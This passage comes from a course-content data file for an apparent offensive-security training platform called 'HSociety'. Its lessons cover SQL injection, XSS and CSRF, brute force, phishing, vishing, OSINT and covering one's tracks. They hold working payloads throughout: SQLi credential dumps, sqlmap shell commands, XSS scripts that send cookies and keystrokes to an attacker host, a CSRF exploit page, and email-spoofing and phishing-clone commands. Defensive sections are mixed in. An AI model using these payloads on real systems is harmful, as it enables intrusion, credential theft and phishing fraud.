# Extract usernames and password hashes
curl "http://<target_ip>/api/products?id=1 UNION SELECT username,password FROM users"
\`\`\`

*Training Task:* You've extracted a hash: \`5f4dcc3b5aa765d61d8327deb882cf99\`. Use the terminal to identify the hashing algorithm (MD5, SHA1, etc.) and attempt to crack it using an online database or \`hashcat\`.`,
              image: null,
            },
            {
              title: 'UNION-Based Data Exfiltration',
              instruction:
                `UNION-based injection is the fastest way to extract massive amounts of data from an HSociety target. It works by appending your own query results to the legitimate ones returned by the application.

**1. Determining the Column Count:**
The UNION operator requires the same number of columns in both queries.
\`\`\`bash
# Increment the number until the error disappears (ORDER BY trick)
curl "http://<target_ip>/api/products?id=1 ORDER BY 1--"
curl "http://<target_ip>/api/products?id=1 ORDER BY 2--"
curl "http://<target_ip>/api/products?id=1 ORDER BY 3--" # If this fails, we have 2 columns.
\`\`\`

**2. Identifying Data Types:**
We need to know which columns can display text.
\`\`\`bash
# Replace NULLs with strings to see where they appear on the page
curl "http://<target_ip>/api/products?id=1 UNION SELECT 'test1','test2'"
\`\`\`

**3. Extracting System Information:**
\`\`\`bash
# Get the current database user and name
curl "http://<target_ip>/api/products?id=1 UNION SELECT user(),database()"
\`\`\`

**4. Concatenating Multiple Columns:**
If only one column is displayed, combine your data into a single string.
\`\`\`bash
# Use CONCAT to pull user:pass in one go
curl "http://<target_ip>/api/products?id=1 UNION SELECT CONCAT(username,':',password),NULL FROM users"
\`\`\`

**5. Bypassing Filters with Hex Encoding:**
If the WAF blocks 'users', encode the table name in hex.
\`\`\`bash
# 'users' in hex = 0x7573657273
curl "http://<target_ip>/api/products?id=1 UNION SELECT password,NULL FROM users WHERE username=0x61646d696e"
\`\`\`

**6. Reading Files from the OS:**
In high-privilege scenarios, the database can read local files.
\`\`\`bash
# Attempt to read the system passwd file
curl "http://<target_ip>/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL"
\`\`\`

*Operative Insight:* Always check if you can write files too! \`SELECT ... INTO OUTFILE '/var/www/html/shell.php'\` is how an HSociety operative turns a SQL injection into a full web shell.`,
              image: null,
            },
            {
              title: 'Automation & Precision: Sqlmap Mastery',
              instruction:
                `Manual injection is for discovery; \`sqlmap\` is for industrial-scale extraction. As an HSociety operative, you must master the flags of this powerful engine to bypass WAFs and automate the tedious parts of the engagement.

**1. Basic Automated Probing:**
\`\`\`bash
# Detect and confirm the injection point
sqlmap -u "http://<target_ip>/api/products?id=1" --batch
\`\`\`

**2. Enumerating the Infrastructure:**
\`\`\`bash
# List all databases and identify the current user's privileges
sqlmap -u "http://<target_ip>/api/products?id=1" --dbs --is-dba
\`\`\`

**3. Targeting Specific Data:**
\`\`\`bash
# Dump the 'users' table from the 'hsociety_prod' database
sqlmap -u "http://<target_ip>/api/products?id=1" -D hsociety_prod -T users --dump
\`\`\`

**4. Handling POST Requests & Cookies:**
\`\`\`bash
# Use a request file captured from Burp Suite (The Pro way)
sqlmap -r request.txt --level 3 --risk 2

# Provide your session cookie to bypass login walls
sqlmap -u "http://<target_ip>/admin/view?id=1" --cookie="session=trainee_123"
\`\`\`

**5. Evading WAF/IDS with Tampers:**
If your scan is being blocked, change the signature of your payloads.
\`\`\`bash
# Use the 'space2comment' tamper to bypass simple keyword filters
sqlmap -u "http://<target_ip>/api/products?id=1" --tamper=space2comment
\`\`\`

**6. Gaining System-Level Access:**
\`\`\`bash
# Attempt to spawn an interactive OS shell (Requires high DB privileges)
sqlmap -u "http://<target_ip>/api/products?id=1" --os-shell
\`\`\`

*Final Training Project:* Perform a full audit of the HSociety target app. Document the vulnerable parameter, the database version, and extract the admin hash. Then, write a one-paragraph 'Remediation Guide' for the developers, explaining how to use **Parameterized Queries** to kill this bug forever.`,
              image: null,
            },
          ],
        },
        {
          id: 'room4',
          title: 'XSS & CSRF',
          overview:
            "The browser is the most dangerous environment in the digital world. In this room, you will master client-side exploitation, learning how to execute your own code in the context of other users' browsers (XSS) and trick them into performing actions they never intended (CSRF). To train like a hacker is to weaponize the very trust that the web is built on.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Cross-Site Scripting (XSS): Code Execution',
              instruction:
                `XSS isn't just about 'alerts'; it's about full JavaScript execution in a victim's session. To become an HSociety operative, you must learn to identify where an application fails to 'sanitize' user input, allowing your payload to be rendered as code.

**1. Reflected XSS (The Immediate Echo):**
The payload is sent in the URL and reflected back.
\`\`\`bash
# Basic alert to prove execution
curl "http://<target_ip>/search?q=<script>alert('HSociety')</script>"

# Bypassing simple filters with an image tag
curl "http://<target_ip>/search?q=<img src=x onerror=alert(1)>"
\`\`\`

**2. Stored XSS (The Persistent Trap):**
The payload is saved on the server (e.g., in a comment or profile).
\`\`\`bash
# Submit a payload via a POST request to the comments section
curl -d "comment=<script>fetch('http://<attacker_ip>/log?c=' %2b document.cookie)</script>" -X POST http://<target_ip>/api/comments
\`\`\`

**3. DOM-Based XSS (The Client-Side Shadow):**
The vulnerability lives in the client-side JavaScript, not the server response.
\`\`\`text
Target URL: http://<target_ip>/dashboard#user=<img src=x onerror=alert(1)>
# (The payload after '#' is never sent to the server but processed by the browser)
\`\`\`

**4. Bypassing Script-Tag Filters:**
\`\`\`bash
# Use SVG tags for execution
curl "http://<target_ip>/search?q=<svg/onload=alert(1)>"

# Use encoded characters to hide the payload
curl "http://<target_ip>/search?q=%3cscript%3ealert(1)%3c/script%3e"
\`\`\`

**5. Testing for Filter Weaknesses:**
\`\`\`bash
# Check if the application removes 'script' tags but leaves the inner content
curl "http://<target_ip>/search?q=<scr<script>ipt>alert(1)</script>"
\`\`\`

**6. Automated XSS Probing:**
\`\`\`bash
# Use Nmap scripts to find common XSS points
nmap -p 80 --script http-xssed <target_ip>
\`\`\`

*Operative Drill:* Why is Stored XSS considered more dangerous than Reflected XSS in a professional engagement? How can an HSociety operative use Stored XSS to compromise an entire organization?`,
              image: null,
            },
            {
              title: 'XSS Impact: Weaponizing the Session',
              instruction:
                `An HSociety operative doesn't stop at an \`alert()\`. The goal of XSS is to gain control. By stealing session cookies or capturing keystrokes, you can effectively become the victim within the application.

**1. Cookie Theft & Exfiltration:**
\`\`\`javascript
// Payload to send the victim's session cookie to your listener
<script>
    fetch('http://<attacker_ip>/steal?cookie=' + btoa(document.cookie));
</script>
\`\`\`

**2. Capturing the CSRF Token:**
If an app has CSRF protection, use XSS to read the token and bypass it.
\`\`\`javascript
// Read a hidden input field named 'csrf_token'
<script>
    var token = document.getElementsByName('csrf_token')[0].value;
    fetch('http://<attacker_ip>/token?v=' + token);
</script>
\`\`\`

**3. Keystroke Logging (Keylogger):**
\`\`\`javascript
// Record every key the user types on the page
<script>
    document.onkeypress = function(e) {
        fetch('http://<attacker_ip>/keys?k=' + e.key);
    };
</script>
\`\`\`

**4. Setting up the Operative Listener:**
\`\`\`bash
# Use Netcat to catch the incoming cookies/keys
nc -lvnp 80

# Use a simple Python server for multi-user logging
python3 -m http.server 80
\`\`\`

**5. Decoding the Stolen Goods:**
\`\`\`bash
# Decode the Base64 cookie received in your logs
echo "c2Vzc2lvbj10cmFpbmVlXzEyMw==" | base64 -d
\`\`\`

**6. Forcing a Redirect (Phishing):**
\`\`\`javascript
// Silently redirect the user to a fake login page
<script>
    window.location.replace('http://<target_ip>');
</script>
\`\`\`

*Training Task:* Identify a page on the HSociety target that reflects your name. Inject a payload that changes the background color of the page to black. Then, upgrade it to a payload that logs \`document.domain\` to your console.`,
              image: null,
            },
            {
              title: 'Cross-Site Request Forgery (CSRF): The Forced Action',
              instruction:
                `CSRF is the art of 'Identity Theft by Proxy.' It works because browsers automatically include cookies with requests to a domain, allowing an HSociety operative to force a victim to perform actions (like changing a password) simply by visiting a malicious page.

**1. Identifying Vunerable Actions:**
Look for state-changing requests (POST/PUT/DELETE) that lack a random token.
\`\`\`http
POST /api/user/change-email HTTP/1.1
Host: <target_ip>
Cookie: session=victim_token

email=hacker@<target_ip>
\`\`\`

**2. Crafting the Exploit Page:**
\`\`\`html
<!-- Hosted on <attacker_ip> -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://<target_ip>/api/user/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@<target_ip>" />
    </form>
  </body>
</html>
\`\`\`

**3. Testing for Token Presence via CLI:**
\`\`\`bash
# Check the raw HTML of a form for a CSRF token
curl -s http://<target_ip>/settings | grep -i "token"
\`\`\`

**4. Bypassing Weak Token Validation:**
\`\`\`bash
# Try removing the token entirely to see if the server still accepts the request
curl -d "email=<attacker_ip>" -X POST http://<target_ip>/api/user/change-email

# Try using a token from a different user session
curl -b "session=hacker_token" -d "token=VICTIM_TOKEN" ...
\`\`\`

**5. Exploiting GET-Based CSRF:**
(The easiest to exploit—can be triggered via a simple \`<img>\` tag)
\`\`\`html
<img src="http://<target_ip>/api/admin/delete-user?id=100" style="display:none;" />
\`\`\`

**6. Analyzing the 'Referer' Check:**
\`\`\`bash
# Test if the server only checks the Referer header (spoof it!)
curl -e "http://<target_ip>/" -d "action=delete" http://<target_ip>/api/data
\`\`\`

*Operative Insight:* CSRF tokens must be **Random, Unique per session, and Validated on the server**. If any of these are missing, the HSociety operative has an opening.`,
              image: null,
            },
            {
              title: 'Defensive Engineering: Content Security Policy',
              instruction:
                `To train like a hacker is to understand the ultimate defense: the Content Security Policy (CSP). CSP is a set of rules that tells the browser which scripts are 'legal,' effectively killing most XSS attacks if implemented correctly.

**1. Auditing a CSP Header:**
\`\`\`bash
# Extract and analyze the CSP header of a target
curl -s -I http://<target_ip> | grep -i "Content-Security-Policy"
\`\`\`

**2. Identifying 'Unsafe' Directives:**
A CSP that allows \`unsafe-inline\` is essentially useless against XSS.
\`\`\`text
Policy: script-src 'self' 'unsafe-inline';
# (This allows any <script> tag on the page to execute!)
\`\`\`

**3. Testing CSP Restrictions:**
\`\`\`bash
# Try to load a script from an external domain
curl "http://<target_ip>/search?q=<script src='http://<attacker_ip>/xss.js'></script>"
# (The browser will block this if 'script-src' is set to 'self')
\`\`\`

**4. Remediation: Proper Output Encoding:**
\`\`\`javascript
// VULNERABLE:
element.innerHTML = userInput;

// SECURE:
element.textContent = userInput;
\`\`\`

**5. Secure Cookie Attributes (The Last Line):**
\`\`\`bash
# Ensure cookies are protected even if XSS occurs
# Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
\`\`\`

**6. Implementing CSRF Protections:**
\`\`\`javascript
// SECURE: Verify a random token on every POST request
if (req.body.csrf_token !== req.session.csrf_token) {
    throw new Error("Potential CSRF attack detected!");
}
\`\`\`

*Final Training Insight:* The war between XSS/CSRF and CSP/Tokens is a game of details. One missing 'HttpOnly' flag or one 'unsafe-eval' in a CSP can be the difference between a secure app and a total compromise. Train like a hacker, build like an engineer.`,
              image: null,
            },
          ],
        },
        {
          id: 'room5',
          title: 'Authentication Attacks',
          overview:
            'Authentication is the front door of every application — and it is often left unlocked. This room covers brute force, session attacks, and the full range of authentication weaknesses you will encounter in real engagements.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Brute Force and Password Spraying',
              instruction:
                `Brute force attacks try every possible password. Password spraying tries one common password against many accounts. Both are used to gain initial access.

**Brute force with Hydra:**
\`\`\`bash
# Brute force HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form "<target_site>/login:username=^USER^&password=^PASS^:Invalid credentials"

# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Brute force with a username list
hydra -L users.txt -P passwords.txt http-post-form \
      "<target_site>/login:username=^USER^&password=^PASS^:Invalid"

# Password spraying (one password, many users)
hydra -L users.txt -p "Password123!" http-post-form \
      "<target_site>/login:username=^USER^&password=^PASS^:Invalid"
\`\`\`

**Brute force with Burp Suite Intruder:**
1. Capture the login request in Burp Proxy
2. Right-click → Send to Intruder
3. In Intruder → Positions, mark the password field with §
4. In Intruder → Payloads, load a wordlist
5. Start the attack
6. Sort by response length — a different length usually indicates success

**What to look for in the application's response:**
- Does it lock out after N failed attempts? (good security control)
- Does it throttle (slow down) after failures? (good)
- Does it do nothing? (vulnerable to brute force)
- Does it reveal whether the username exists? (username enumeration)

Attempt a brute force on the demo login. Document the application's response to repeated failures.`,
              image: null,
            },
            {
              title: 'Session Token Analysis',
              instruction:
                `Session tokens are the keys to authenticated sessions. Weak tokens can be predicted or forged.

**Analysing session tokens:**
\`\`\`bash
# Log in multiple times and collect session tokens
curl -v -c - -d "username=admin&password=test" http://<target_site>/login 2>&1 | grep "Set-Cookie"

# Decode a base64 token
echo "dXNlcjoxMjM0NTY=" | base64 -d
# Output: user:123456

# Decode a JWT token (JSON Web Token)
# JWT format: header.payload.signature (base64url encoded)
echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
# Output: {"user":"admin"}
\`\`\`

**What makes a session token weak:**
- **Predictable** — sequential numbers, timestamps, or simple patterns
- **Short** — fewer than 128 bits of entropy
- **Not invalidated on logout** — the token remains valid after the user logs out
- **Not rotated after privilege change** — the same token is used before and after login

**Testing token invalidation:**
\`\`\`bash
# 1. Log in and capture the session token
# 2. Log out
# 3. Try to use the old token to access a protected page
curl -b "session=old_token_here" http://<target_site>/dashboard

# If you get a 200 response, the token was not invalidated on logout
\`\`\`

Log in to the demo application. Collect 5 session tokens from 5 separate logins. Are they random? Are they predictable? Log out and test whether the token is still valid.`,
              image: null,
            },
            {
              title: 'Session Fixation and Hijacking',
              instruction:
                `Session fixation forces a victim to use a known session ID. Session hijacking steals an existing session token.

**Session fixation attack:**
\`\`\`bash
# 1. Attacker gets a valid (unauthenticated) session token from the server
curl http://<target_site>/  # Server sets: Set-Cookie: session=KNOWN_TOKEN

# 2. Attacker tricks the victim into using this token
# (via a link: http://<target_site>/login?session=KNOWN_TOKEN)

# 3. Victim logs in — if the server does not rotate the token on login,
#    the attacker's known token is now authenticated

# 4. Attacker uses the known token to access the victim's account
curl -b "session=KNOWN_TOKEN" http://<target_site>/dashboard
\`\`\`

**Testing for session fixation:**
\`\`\`bash
# 1. Get a session token before logging in
BEFORE_LOGIN=$(curl -c - http://<target_site>/ 2>&1 | grep session | awk '{print $7}')

# 2. Log in
curl -b "session=$BEFORE_LOGIN" -d "username=admin&password=test" http://<target_site>/login

# 3. Check if the token changed after login
AFTER_LOGIN=$(curl -c - -b "session=$BEFORE_LOGIN" http://<target_site>/dashboard 2>&1 | grep session | awk '{print $7}')

echo "Before: $BEFORE_LOGIN"
echo "After: $AFTER_LOGIN"
# If they are the same, the application is vulnerable to session fixation
\`\`\`

**Session hijacking via XSS:**
If you have XSS, you can steal the session cookie and use it to impersonate the victim — this is why HttpOnly cookies are important.

Test the demo application for session fixation. Document whether the session token changes after login.`,
              image: null,
            },
            {
              title: 'Authentication Findings Report',
              instruction:
                `Write a complete authentication assessment report for the demo application.

**Structure your report as follows:**

**Executive Summary:** One paragraph describing the overall authentication security posture.

**Finding 1 — No Account Lockout:**
\`\`\`bash
Title: No Account Lockout on Login Endpoint
Severity: Medium
Evidence: 100 failed login attempts were made without any lockout or throttling.
          Command used: hydra -l admin -P wordlist.txt http-post-form "..."
Impact: An attacker can brute force user passwords without restriction.
Remediation: Implement account lockout after 5-10 failed attempts.
             Implement CAPTCHA or rate limiting on the login endpoint.
\`\`\`

**Finding 2 — Session Token Not Invalidated on Logout:**
\`\`\`bash
Title: Session Token Remains Valid After Logout
Severity: High
Evidence: After logging out, the session token [TOKEN] was used to access
          /dashboard and received a 200 response.
Impact: If a session token is stolen (via XSS, network interception, or
        log exposure), it remains valid indefinitely after the user logs out.
Remediation: Invalidate session tokens server-side on logout.
             Implement session expiry (e.g. 30 minutes of inactivity).
\`\`\`

Write findings for every authentication weakness you discovered. Be specific — include the exact evidence, the HTTP requests and responses, and concrete remediation steps.`,
              image: null,
            },
          ],
        },
      ],
    },

    // ── PHASE 5: SOCIAL ENGINEERING (moduleId: 5, 4 rooms) ──────────────────
    {
      id: 'phase5',
      title: 'Social Engineering',
      codename: 'PHASE 5',
      color: PHASE_COLORS.phase5,
      rooms: [
        {
          id: 'room1',
          title: 'Phishing & Pretexting',
          overview:
            "The most sophisticated firewall in the world is useless if a user is tricked into opening the gate. In this room, you will master the art of 'Human Hacking,' learning the psychological triggers and technical spoofing methods used by HSociety operatives to bypass digital defenses. To train like a hacker is to understand that the human brain is the most vulnerable OS on the network.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'The Psychology of Influence',
              instruction:
                `To become a hacker, you must learn to speak the language of the target's subconscious. Social engineering isn't about lying; it's about creating a reality where compliance is the only logical choice.

**The Six Principles of HSociety Influence:**

1.  **Authority:** Impersonating IT support or an executive.
2.  **Urgency:** Creating a 'crisis' that requires immediate action.
3.  **Social Proof:** Implying that 'everyone else' has already complied.
4.  **Liking:** Building a rapport through shared interests or common ground.
5.  **Reciprocity:** Giving a small 'gift' to induce a feeling of obligation.
6.  **Commitment:** Getting a small 'Yes' before asking for the 'Big Win.'

**Analyzing Technical Metadata:**
\`\`\`bash
# Extract metadata from a target's public image to find GPS coordinates (Liking/Authority)
exiftool target_photo.webp | grep -i "GPS"

# Build a custom wordlist from the target's website to craft a believable pretext
cewl -d 2 -m 5 http://<target_ip> -w custom_pretext.txt
\`\`\`

**Identifying Employee Patterns:**
\`\`\`bash
# Search for target employees on LinkedIn via Google Dorking
site:<social_professional_site>/in "HSociety" "Engineer"

# Construct a list of potential targets based on job titles
echo "admin@<target_ip>" >> targets.txt
echo "hr@<target_ip>" >> targets.txt
\`\`\`

**Simulating a Social Engineering Scenario:**
\`\`\`bash
# Generate a list of 'typosquat' domains to use in a phishing campaign
dnstwist --format csv <target_ip> > typosquats.csv
\`\`\`

*Operative Drill:* Look at a real phishing email. Identify the 'Call to Action.' Does it use Urgency ("Reset now") or Authority ("By order of the CEO")? How would an HSociety operative combine both?`,
              image: null,
            },
            {
              title: 'Anatomy of a Spoofed Engagement',
              instruction:
                `A successful phishing campaign requires technical precision. To train like a hacker is to understand the protocols that govern email trust—and how to bypass them. You must learn to forge headers and create deceptive payloads that look identical to legitimate communication.

**1. Technical Spoofing Drills:**
\`\`\`bash
# Check if a target's domain has a weak SPF policy (Allows spoofing)
dig <target_domain> TXT | grep "v=spf1"

# Verify if DKIM or DMARC is implemented correctly
dig _dmarc.<target_ip> TXT
\`\`\`

**2. Crafting the Malicious Link:**
\`\`\`bash
# Use a URL shortener to hide the true destination (e.g., bit.ly)
# http://bit.ly/hsociety-training -> http://<attacker_ip>/login-clone

# Create an HTML-encoded link to bypass basic scanners
echo -n "http://<attacker_ip>/steal" | base64
# aHR0cDovL2hhY2tlci5sYWIvc3RlYWw=
\`\`\`

**3. Simulating Sender Forgery:**
\`\`\`bash
# Use 'sendemail' to simulate a spoofed message (requires an open relay)
sendemail -f admin@<target_ip> -t trainee@target.local -u "URGENT: Password Reset" -m "Click here: http://<attacker_ip>/reset"
\`\`\`

**4. Harvesting OSINT for the Pretext:**
\`\`\`bash
# Find old email addresses associated with the target domain
theHarvester -d <target_ip> -l 500 -b google
\`\`\`

**5. Building a Credential Harvester:**
Clone the target's login page using \`httrack\` or the Social Engineer Toolkit (SET).
\`\`\`bash
# Clone a single page for a phishing landing site
httrack "http://<target_ip>/login" -O "./clone_site"
\`\`\`

**6. Analyzing Email Headers (Surveillance):**
\`\`\`bash
# Extract the IP address of the true sending server from raw headers
grep "Received: from" raw_email.txt | awk '{print $4}'
\`\`\`

*Hacker's Strategy:* A 'Lookalike Domain' (e.g., \`<lookalike_domain>\` with an 'l') is often more effective than direct spoofing, as it bypasses modern SPF/DKIM checks entirely.`,
              image: null,
            },
            {
              title: 'Pretexting & Vishing: The Vocal Exploit',
              instruction:
                `Vishing (Voice Phishing) is the live execution of a pretext. To become a hacker, you must learn to maintain a persona under pressure, using the 'Reason-Request-Urgency' framework to extract information in real-time.

**1. The Pretext Blueprint:**
- **The Role:** Who are you? (IT Helpdesk, External Auditor, New Hire).
- **The Reason:** Why are you calling? (Critical patch, mandatory survey).
- **The Hook:** What do you want? (VPN token, private IP, manager's name).
- **The Deadline:** Why now? (Server reboot in 10 mins).

**2. Weaponizing Internal Knowledge:**
\`\`\`bash
# Find the company's phone extension pattern
site:<target_domain> "Phone:" "Ext"

# Build a list of internal department names to sound 'Local'
curl -s http://<target_ip>/about | grep -i "Department"
\`\`\`

**3. Simulating a Vishing Target List:**
\`\`\`bash
# Extract names and titles from the target's 'Team' page
curl -s http://<target_ip>/team | grep "<h3>" | sed 's/<[^>]*>//g'
\`\`\`

**4. Spoofing Caller ID (Concept):**
Operatives use VoIP services to change the outgoing 'From' number to match the target's internal IT department.

**5. Using 'Background Noise' for Credibility:**
Playing a recording of a busy call center or server room during the call to reinforce the IT Helpdesk pretext.

**6. Automated Target Profiling:**
\`\`\`bash
# Search for target mentions in news or press releases to find 'Hooks'
site:news.<search_engine> "HSociety" "Acquisition"
\`\`\`

*Training Task:* You are pretending to be James from IT. Your goal is to get a trainee to reveal their 'Agent ID.' Write a 3-sentence script that uses the **Reciprocity** principle (give a tip, get an ID).`,
              image: null,
            },
            {
              title: 'Defensive Counter-Measures',
              instruction:
                `To train like a hacker is to know how the enemy thinks—and how to stop them. As an HSociety operative, you must be able to train others to spot the subtle 'glitches' in a social engineering attack.

**1. Technical Verification:**
\`\`\`bash
# Train users to hover over every link to see the real URL
# Link: http://<target_ip>/verify
# Actual: http://<attacker_ip>/log?user=123
\`\`\`

**2. Implementing 'Out-of-Band' Auth:**
Never trust a single channel. If someone calls asking for a password, verify their identity via an internal chat or a separate email.

**3. Auditing SPF/DMARC Policies:**
\`\`\`bash
# Ensure the domain policy is set to 'Reject' (p=reject)
dig _dmarc.<target_ip> TXT | grep "p=reject"
\`\`\`

**4. Email Sandboxing:**
Using automated tools to open links and attachments in a secure 'bubble' before they reach the user.

**5. Password Manager Enforcement:**
If users use password managers, they are less likely to type their password into a phishing site (because the manager won't recognize the fake domain).

**6. Reporting Procedures:**
Establish a 'One-Click' reporting system where users can flag suspicious emails directly to the HSociety security team.

*Final Insight:* Social engineering is the only attack that works on every platform. Whether it's Linux, Windows, or Cloud, the human is always the weakest link. Congratulations on completing this unit of the HSociety Operative program.`,
              image: null,
            },
          ],
        },
        {
          id: 'room2',
          title: 'OSINT Fundamentals',
          overview:
            "Before you ever touch a keyboard on a target system, you must know it better than its own owners. Open Source Intelligence (OSINT) is the art of gathering the pieces of a puzzle from the public domain. In this room, you will learn to use the internet as your primary reconnaissance tool, harvesting data from search engines, social media, and hidden databases to build a complete profile of the HSociety target.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Google Dorking: The Search Operator',
              instruction:
                `Google is more than a search engine; it is a massive, indexed database of the world's misconfigurations. To train like a hacker is to use 'Dorks'—advanced search operators—to find information that was never meant to be public.

**Essential Dorking Drills:**
\`\`\`bash
# Find all subdomains and pages on the target
site:<target_domain>

# Search for sensitive file types (Config, DB, Keys)
site:<target_domain> filetype:sql OR filetype:env OR filetype:key

# Identify 'Index Of' pages (Exposed directory listings)
site:<target_domain> intitle:"index of"
\`\`\`

**Advanced Data Mining:**
\`\`\`bash
# Locate login pages or administrative panels
site:<target_domain> inurl:login OR inurl:admin

# Find files containing specific 'Internal' strings
site:<target_domain> "confidential" OR "internal use only"

# Search for publicly indexed backup files
site:<target_domain> filetype:bak OR filetype:old OR filetype:swp
\`\`\`

**Identifying Technology Stacks:**
\`\`\`bash
# Search for specific CMS or framework paths
site:<target_domain> inurl:/wp-content/ OR inurl:/node_modules/

# Look for default error pages that reveal server info
site:<target_domain> "Apache2 Ubuntu Default Page"
\`\`\`

**Operative Research:**
\`\`\`bash
# Search Pastebin and other dump sites for the target domain
site:<paste_site> "<target_ip>"

# Look for employee names associated with the domain
site:<target_domain> "email" "contact"
\`\`\`

**GHDB Integration:**
The Google Hacking Database (GHDB) is your library of pre-built dorks.
\`\`\`bash
# Example Dork for finding sensitive PHP info pages
# inurl:phpinfo.php "PHP Version"
\`\`\`

**Cleaning Your Own Tracks:**
\`\`\`bash
# Search for your own name or handle to see your public footprint
"HackerTrainee" site:<code_repo_site>
\`\`\`

*Operative Insight:* Google Dorking is passive reconnaissance. The target has no idea you are searching for them because you are talking to Google's servers, not theirs. This is the ultimate 'Invisible' recon.`,
              image: null,
            },
            {
              title: 'Automated OSINT: The Harvester & Shodan',
              instruction:
                `Manually searching is for surgical strikes; automation is for total theater awareness. HSociety operatives use powerful engines to aggregate data from hundreds of sources simultaneously, mapping out an organization's entire digital footprint in seconds.

**1. Aggregating Emails & Subdomains:**
\`\`\`bash
# Use 'theHarvester' to find emails, names, and IPs
theHarvester -d <target_ip> -l 500 -b google,bing,crtsh

# Extract only the discovered email addresses to a file
theHarvester -d <target_ip> -b all | grep "@" | sort -u > emails.txt
\`\`\`

**2. Shodan: The Search Engine for Things:**
Shodan scans the entire internet every day, indexing every open port and service.
\`\`\`bash
# Find all HSociety-owned assets indexed by Shodan
shodan search org:"HSociety Corp"

# Identify specific vulnerable services (e.g., old SSH)
shodan search "port:22 product:OpenSSH version:7.2"
\`\`\`

**3. Interrogating IP Metadata:**
\`\`\`bash
# Get detailed host info including location and vulnerabilities
shodan host <target_ip>

# See which ports are 'trending' in a specific organization
shodan stats org:"HSociety" port
\`\`\`

**4. Recon-ng: The Modular Framework:**
\`\`\`bash
# Start the recon-ng shell
recon-ng

# Install and use a module to find hosts from a domain
marketplace install recon/domains-hosts/hackertarget
modules load recon/domains-hosts/hackertarget
options set SOURCE <target_ip>
run
\`\`\`

**5. Certificate Transparency (CRT.sh):**
\`\`\`bash
# Find subdomains by searching public SSL certificate logs
curl -s "https://crt.sh/?q=<target_ip>&output=json" | jq -r '.[].name_value' | sort -u
\`\`\`

**6. WHOIS & Infrastructure Ownership:**
\`\`\`bash
# Identify the registrar and nameservers for a domain
whois <target_ip>

# Find other domains hosted on the same IP (Shared hosting check)
dig +short <target_ip> | xargs -I {} curl -s "https://api.hacker<target_site>/reverseiplookup/?q={}"
\`\`\`

*Hacker's Strategy:* Shodan is your 'Time Machine.' It shows you what was open yesterday, even if the target has closed the port today. Use it to find 'Shadow IT' that the security team forgot about.`,
              image: null,
            },
            {
              title: 'Social Media OSINT & Human Mapping',
              instruction:
                `An organization isn't just servers; it's people. To train like a hacker is to build a 'Social Graph' of the target. By analyzing LinkedIn, X (Twitter), and GitHub, an HSociety operative can find the right person to target for a phishing or vishing attack.

**1. Mapping the Org Chart via LinkedIn:**
\`\`\`bash
# Use a specific Dork to find decision makers
site:<social_professional_site>/in "HSociety" "Director" OR "VP"

# Identify the IT and Security staff
site:<social_professional_site>/in "HSociety" "Security Analyst" OR "SysAdmin"
\`\`\`

**2. Building Naming Convention Lists:**
\`\`\`bash
# If you find 'j.smith@<target_ip>', the pattern is 'first_initial.last'
# Construct a list for a new name: 'Alice Cooper'
echo "a.cooper@<target_ip>" >> wordlist.txt
\`\`\`

**3. GitHub Recon: Searching for Leaks:**
Developers often accidentally commit API keys or passwords.
\`\`\`bash
# Search GitHub for the target's internal domain
site:<code_repo_site> "<target_ip>" "password"

# Search for hardcoded internal API endpoints
site:<code_repo_site> "<target_ip>" "api_key"
\`\`\`

**4. Identifying Technology via Job Posts:**
\`\`\`bash
# Search job boards to see what the target is hiring for
site:<job_site> "HSociety" "AWS" "Kubernetes"
# (This tells you they use AWS and K8s!)
\`\`\`

**5. Tracking Visual Clues (The 'Badge' Photo):**
Operatives look for employee photos that accidentally show badges or internal office layouts.
\`\`\`bash
# Use Google Image search to find office photos
site:<social_media_site> "HSociety" "office"
\`\`\`

**6. Passive DNS History:**
\`\`\`bash
# See where the domain pointed in the past (Find old servers)
curl -s "https://api.hacker<target_site>/reversedns/?q=<target_ip>"
\`\`\`

*Operative Drill:* Find a public GitHub repo for a large project. Can you find any 'TODO' comments in the code that mention security issues? These are often the 'First Domino' in an HSociety engagement.`,
              image: null,
            },
            {
              title: 'Operational Security (OPSEC): Staying Invisible',
              instruction:
                `Reconnaissance is a two-way street. If you are not careful, you will leave your own OSINT trail for the target to find. To become a hacker is to master OPSEC, ensuring your training remains anonymous and your identity stays protected.

**1. Masking Your IP Address:**
\`\`\`bash
# Use TOR to run a command anonymously
torify curl http://<target_ip>

# Verify your 'Public' IP is different from your real one
curl https://<check_ip_site>
\`\`\`

**2. Managing Digital Fingerprints:**
\`\`\`bash
# Use a custom 'User-Agent' that matches a common browser
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://<target_ip>
\`\`\`

**3. Cleaning Local Metadata:**
\`\`\`bash
# Remove all metadata from your own screenshots before uploading
exiftool -all= engagement_screenshot.webp
\`\`\`

**4. Secure Communication:**
Always use encrypted channels (Signal, PGP, ProtonMail) when discussing engagement details with your HSociety team.

**5. Disposable Personas (Sock Puppets):**
Create 'Burner' accounts for social media research. Never use your real identity, phone number, or photo.

**6. Clearing Environment Trails:**
\`\`\`bash
# Unset your target variables when finished
unset TARGET_IP
unset HS_API_KEY

# Clear your command history for the session
history -c
\`\`\`

*Final Training Insight:* OSINT is the foundation of everything that follows. A well-researched engagement takes 5 minutes; a poorly researched one takes 5 days. You have now mastered the art of the 'Invisible Operative.' Congratulations on completing Phase 5.`,
              image: null,
            },
          ],
        },
        {
          id: 'room3',
          title: 'Physical Security',
          overview:
            "Physical access is the ultimate bypass. All the digital firewalls in the world are useless if an HSociety operative can simply walk into the server room and plug in a USB. In this room, you will learn the techniques of physical intrusion, from tailgating and badge cloning to the art of the social engineer's 'walk-through.' To become a hacker is to understand that the lock on the door is just another protocol to be cracked.",
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Tailgating & Physical Reconnaissance',
              instruction:
